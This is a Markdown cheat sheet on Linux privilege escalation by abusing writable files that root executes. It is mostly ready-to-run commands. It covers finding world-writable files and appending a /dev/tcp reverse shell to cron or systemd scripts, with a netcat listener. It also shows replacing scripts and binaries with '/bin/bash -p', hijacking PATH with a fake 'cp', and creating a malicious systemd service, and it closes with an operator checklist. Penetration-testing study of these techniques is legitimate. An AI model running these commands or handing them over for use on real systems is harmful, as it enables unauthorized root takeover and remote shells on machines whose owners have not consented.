
# Writable Files & Permission Abuse  

Writable files owned or executed by privileged users (root/system) are one of the simplest and most reliable privilege escalation paths.

If you can modify a script or binary that **root** runs → you can own the machine.

---

## 1. Identify Writable Files

### World-writable files
```bash
find / -perm -2 -type f 2>/dev/null
````

### Writable by your user or group

```bash
find / -writable -type f 2>/dev/null
```

### Writable directories

```bash
find / -perm -2 -type d 2>/dev/null
```

Writable directories → potential **PATH hijack**, custom binary replacement, cron injection, or malicious file drop.

---

## 2. Check for Scripts Executed by Root

Common locations:

```
/etc/cron.*
/usr/local/bin
/usr/local/sbin
/opt
/scripts
/backups
```

Inspect suspicious files:

```bash
ls -lah /path/to/script.sh
cat /path/to/script.sh
```

Look for:

* backup scripts
* monitoring scripts
* maintenance scripts
* service helper scripts
* anything called by cron/systemd

If writable → exploitable.

---

## 3. Exploit Writable Root-Executed Script

Append a reverse shell:

```bash
echo "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1" >> /path/to/script.sh
```

Start listener:

```bash
nc -lvnp 4444
```

Wait for cron/systemd to execute → root shell.

---

## 4. Replace Script Completely (if safe in lab)

```bash
echo "/bin/bash -p" > /path/to/script.sh
chmod +x /path/to/script.sh
```

When the privileged process runs it → instant root.

---

## 5. Writable Binaries (Rare but Critical)

If a binary executed by root is writable:

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /usr/local/bin/backup
chmod +x /usr/local/bin/backup
```

Next time the backup job runs → root.

---

## 6. Path Hijacking via Writable Directories

(This ties into [path-hijackin.md](linux_prv_esc/path-hijacking.md) )

If a script run by root calls a binary like:

```
cp file1 file2
tar cz folder/
```

And you have write access to a directory early in `$PATH`:

```bash
echo "/bin/bash -p" > cp
chmod +x cp
export PATH=.:$PATH
```

When the script runs → your fake `cp` runs as root.

---

## 7. Config Files With Privileged Impact

Writable config files that root parses:

* `/etc/profile`
* `/etc/bash.bashrc`
* `/etc/cron*`
* `/etc/ld.so.conf.d/*`
* service configs that execute commands
* `.service` files under systemd

If writable, add payload → root shell.

Example systemd escalation (lab only):

```bash
echo -e "[Service]\nExecStart=/bin/bash -c '/bin/bash -p'" \
> /etc/systemd/system/privesc.service
systemctl enable privesc
systemctl start privesc
```

---

## 8. Operator Checklist

* [ ] Enumerate writable files (`find / -perm -2`)
* [ ] Identify if root executes them (cron/systemd/services)
* [ ] Append or replace content with a controlled command
* [ ] Check for writable directories in `$PATH`
* [ ] Validate escalation with `id`
* [ ] Clean up if needed

---

**Writable files are privilege escalators waiting to be found.**
